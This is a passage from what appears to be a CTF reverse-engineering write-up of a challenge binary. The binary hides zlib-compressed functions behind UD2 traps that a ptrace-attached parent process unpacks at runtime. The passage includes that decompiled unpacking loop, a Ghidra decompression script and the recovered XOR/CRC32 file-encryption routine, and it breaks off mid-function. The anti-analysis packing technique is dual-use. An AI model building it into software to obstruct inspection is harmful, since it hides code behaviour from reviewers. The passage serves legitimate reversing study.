                         do_encrypt_file                                              XREF[4]:   Entry Point(*), child:001014a7(c), 001015d8, 00101718(*)  
      001010ad 0f 0b                    UD2
      001010af c5                       ??                   C5h
      001010b0 00                       ??                   00h
      001010b1 0b                       ??                   0Bh
      001010b2 01                       ??                   01h
      001010b3 00                       ??                   00h
      001010b4 00                       ??                   00h
      001010b5 78                       ??                   78h    x
      001010b6 9c                       ??                   9Ch
      001010b7 0b                       ??                   0Bh
      001010b8 f5                       ??                   F5h
      001010b9 e8                       ??                   E8h
      001010ba 7c                       ??                   7Ch    |
      001010bb ea                       ??                   EAh
      001010bc d1                       ??                   D1h
      001010bd fc                       ??                   FCh
      001010be c6                       ??                   C6h
      001010bf c0                       ??                   C0h
....
</code></pre><p>The first instruction is a <code>UD2</code> which will trigger an invalid instruction and crash the process.</p>
<p>The rest doesnt make sense&hellip; and this is where the parent &ldquo;driver&rdquo; process comes into play.</p>
<p>The parent process has attached the child process with ptrace and can catch the crash (that&rsquo;s just how debugger work by the way).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* wait for child pid */</span>
</span></span><span class="line"><span class="cl">        <span class="nf">wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">wstatus</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* read child process registers */</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">pid</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">child_context</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">       
</span></span><span class="line"><span class="cl">       <span class="cm">/* bits/waitstatus.h
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">        if (!__WIFSTOPPED(status) || (__WEXITSTATUS(status) != 4)) */</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(((</span><span class="n">wstatus</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x7f</span><span class="p">)</span> <span class="o">||</span> <span class="p">(((</span><span class="kt">int</span><span class="p">)</span><span class="n">wstatus</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="o">&amp;</span> <span class="mh">0xffU</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">rip</span> <span class="o">=</span> <span class="n">child_context</span><span class="p">.</span><span class="n">rip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="cm">/* read 8 bytes of data of child data at the address pointed by child&#39;s RIP */</span>
</span></span><span class="line"><span class="cl">        <span class="n">data_at_rip</span> <span class="o">=</span> <span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_PEEKTEXT</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">pid</span><span class="p">,</span><span class="n">child_context</span><span class="p">.</span><span class="n">rip</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* check that the instruction is a UD2
</span></span></span><span class="line"><span class="cl"><span class="cm">           if not, exit
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">           0x0b0f = UD2
</span></span></span><span class="line"><span class="cl"><span class="cm">        */</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="n">data_at_rip</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0xb0f</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* read 2 bytes at rip+2 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">compressed_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">ushort</span><span class="p">)(</span><span class="n">data_at_rip</span> <span class="o">&gt;&gt;</span> <span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="cm">/* read 2 bytes at rip + 4 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">deflate_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">ushort</span><span class="p">)(</span><span class="n">data_at_rip</span> <span class="o">&gt;&gt;</span> <span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">rip</span> <span class="o">=</span> <span class="n">rip</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="cm">/* read data in child&#39;s process starting at RIP+8 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">deflate_buffer</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">((</span><span class="n">ulong</span><span class="p">)</span><span class="n">deflate_size</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">compressed_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="nf">calloc</span><span class="p">((</span><span class="n">ulong</span><span class="p">)</span><span class="n">compressed_size</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">compressed_size</span><span class="p">;</span> <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_PEEKTEXT</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">pid</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">n</span> <span class="o">+</span> <span class="n">rip</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">compressed_buffer</span> <span class="o">+</span> <span class="n">n</span><span class="p">)</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="cm">/* decompress the data */</span>
</span></span><span class="line"><span class="cl">        <span class="nf">do_inflate</span><span class="p">(</span><span class="n">compressed_buffer</span><span class="p">,</span><span class="n">compressed_size</span><span class="p">,</span><span class="n">deflate_buffer</span><span class="p">,</span><span class="n">deflate_size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="cm">/* write them back at original child&#39;s RIP */</span>
</span></span><span class="line"><span class="cl">        <span class="n">local_iov</span><span class="p">.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">deflate_buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">local_iov</span><span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">.</span><span class="n">conflict</span><span class="p">)</span><span class="n">deflate_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">remote_iov</span><span class="p">.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">child_context</span><span class="p">.</span><span class="n">rip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">remote_iov</span><span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">.</span><span class="n">conflict</span><span class="p">)</span><span class="n">deflate_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="nf">process_vm_writev</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_iov</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">remote_iov</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">deflate_buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">compressed_buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* allow child to continue */</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">pid</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>So, when the child process will execute the UD2 instruction, the parent will <em>catch</em> it and will:</p>
<ul>
<li>read 8 bytes of memory at the child RIP
<ul>
<li>verify the last 2 bytes are 0xb0f
<ul>
<li>UD2 instruction&rsquo;s opcode are 0F0B - but little endian&hellip;</li>
</ul>
</li>
<li>read the next 2 bytes as the compressed data size</li>
<li>read the next 4 bytes as the decompressed data size</li>
</ul>
</li>
<li>zlib decompress the compressed data following these 8 bytes</li>
<li>write them back to the child process using <code>process_vm_writev()</code>, starting from the crash (UD2) address
<ul>
<li>it&rsquo;s possible because of the initial call to <code>mprotect()</code> to set the text segment RWX</li>
<li>note that using <code>ptrace(PTRACE_POKEDATA)</code> instead <code>process_vm_writev()</code> doesnt require the destination address to be writable.</li>
</ul>
</li>
<li>resume child execution</li>
</ul>
<p>so basically, this is the layout of a packed function:</p>
<pre tabindex="0"><code>                         *******************************************************
                         *                                                     *
                         *  FUNCTION                                           *
                         *******************************************************
                         undefined do_encrypt_file()
           undefined       AL:1           &lt;RETURN&gt;
                         do_encrypt_file  
      001010ad 0f 0b                    UD2
      001010af c5 00                    dw                   C5h                ; = 195 / compressed size
      001010b1 0b 01 00 00              ddw                  10Bh               ; = 267 / decompressed size
                                    ; compressed data
      001010b5 78                       ??                   78h    x
      001010b6 9c                       ??                   9Ch
      001010b7 0b                       ??                   0Bh
      001010b8 f5                       ??                   F5h
</code></pre><p>The deflate is a simple zlib and if we look at the end of the <code>do_encrypt_file</code> function there&rsquo;s a bunch of NULL bytes and we can see <code>compressed size + number of null bytes + 8 == decompressed size</code>.
These 8 bytes are the size of the UD2 instructions + 2 bytes for the compressed size + 4 bytes for the uncompressed size, so we we can just overwrite the whole function code with the decompressed code (starting from 0x1010ad is this specific case.)</p>
<p>A simple ghidra script can do the deflate in place:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#HTB inflate indefinite</span>
</span></span><span class="line"><span class="cl"><span class="c1">#@author Matthieu Walter</span>
</span></span><span class="line"><span class="cl"><span class="c1">#@category matth.ctf.htb</span>
</span></span><span class="line"><span class="cl"><span class="c1">#@keybinding</span>
</span></span><span class="line"><span class="cl"><span class="c1">#@menupath</span>
</span></span><span class="line"><span class="cl"><span class="c1">#@toolbar</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jarray</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decompress</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">initial_addr</span> <span class="o">=</span> <span class="n">addr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">instr</span> <span class="o">=</span> <span class="n">getShort</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">instr</span> <span class="o">!=</span> <span class="mh">0xb0f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">,</span> <span class="s2">&#34;lol&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="n">addr</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">comp_size</span> <span class="o">=</span> <span class="n">getShort</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;comp size = </span><span class="si">%d</span><span class="s2">&#34;</span><span class="o">%</span><span class="n">comp_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="n">addr</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">dec_size</span> <span class="o">=</span> <span class="n">getShort</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;dec size = </span><span class="si">%d</span><span class="s2">&#34;</span><span class="o">%</span><span class="n">dec_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="n">addr</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">data_buffer</span> <span class="o">=</span> <span class="n">jarray</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">comp_size</span><span class="p">,</span><span class="s2">&#34;b&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">currentProgram</span><span class="o">.</span><span class="n">getMemory</span><span class="p">()</span><span class="o">.</span><span class="n">getBytes</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">data_buffer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data_buffer</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">data_buffer</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">uncompressed_data</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">data_buffer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="n">initial_addr</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">uncompressed_data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">removeDataAt</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">removeInstructionAt</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">setByte</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">addr</span> <span class="o">=</span> <span class="n">addr</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="n">currentAddress</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">decompress</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span></code></pre></div><p>Just put the cursor on the UD2 instruction and run the script, it will do in-place decompression.</p>
<p>Then press D to decompile and  <code>do_file_encryption</code> will change from:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">do_encrypt_file</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">invalidInstructionException</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>to:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">do_encrypt_file</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_2</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">random_8_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">cVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">file_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined8</span> <span class="o">*</span><span class="n">memory_region</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ulong</span> <span class="n">uVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">pcVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte</span> <span class="n">bVar4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">outputfile</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">bVar4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">outputfile</span> <span class="o">=</span> <span class="n">param_2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">         * output filename = filename.enc
</span></span></span><span class="line"><span class="cl"><span class="cm">         */</span>
</span></span><span class="line"><span class="cl">        <span class="n">len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">outputfile</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">len</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">strcpy</span><span class="p">(</span><span class="n">outputfile</span><span class="p">,</span><span class="n">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">uVar2</span> <span class="o">=</span> <span class="mh">0xffffffffffffffff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">pcVar3</span> <span class="o">=</span> <span class="n">outputfile</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">uVar2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">uVar2</span> <span class="o">=</span> <span class="n">uVar2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">cVar1</span> <span class="o">=</span> <span class="o">*</span><span class="n">pcVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">pcVar3</span> <span class="o">=</span> <span class="n">pcVar3</span> <span class="o">+</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">bVar4</span> <span class="o">*</span> <span class="o">-</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">cVar1</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="n">outputfile</span> <span class="o">+</span> <span class="p">(</span><span class="o">~</span><span class="n">uVar2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0x636e652e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)(</span><span class="n">outputfile</span> <span class="o">+</span> <span class="p">(</span><span class="o">~</span><span class="n">uVar2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">file_size</span> <span class="o">=</span> <span class="nf">get_filesize</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">file_size</span> <span class="o">=</span> <span class="n">file_size</span> <span class="o">+</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)((</span><span class="n">uint</span><span class="p">)</span><span class="n">file_size</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* allocate filesize + 8 bytes
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="n">memory_region</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">file_size</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* write the key to the beginning of the file
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">memory_region</span> <span class="o">=</span> <span class="n">random_8_bytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="cm">/* read input file
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read_file_data</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="n">file_size</span><span class="p">,</span><span class="n">memory_region</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* encrypt with key
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">do_encryption</span><span class="p">(</span><span class="n">file_size</span><span class="p">,</span><span class="n">memory_region</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span><span class="n">random_8_bytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* write to output file
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write_file_data</span><span class="p">(</span><span class="n">outputfile</span><span class="p">,</span><span class="n">file_size</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span><span class="n">memory_region</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>rinse and repeat with the other compressed functions.</p>
<p>The <code>do_encryption</code> is XORing each 8 bytes input block with the round key returned by <code>advance(key)</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">do_encryption</span><span class="p">(</span><span class="n">ulong</span> <span class="n">size</span><span class="p">,</span><span class="n">ulong</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span><span class="n">ulong</span> <span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ulong</span> <span class="n">key_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ulong</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key_</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">key_</span> <span class="o">=</span> <span class="nf">advance</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">key_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">dest</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">dest</span><span class="p">)</span> <span class="o">^</span> <span class="n">key_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>and <code>advance</code> is based on CRC32: given an input, it returns crc32(input) concat reverse(crc32(input)).</p>
<p>ex: if crc32(n) == ABCD, it returns ABCDDCBA</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ulong</span> <span class="nf">advance</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ulong</span> <span class="n">uVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte</span> <span class="n">local_40</span> <span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">local_28</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">local_20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">local_28</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
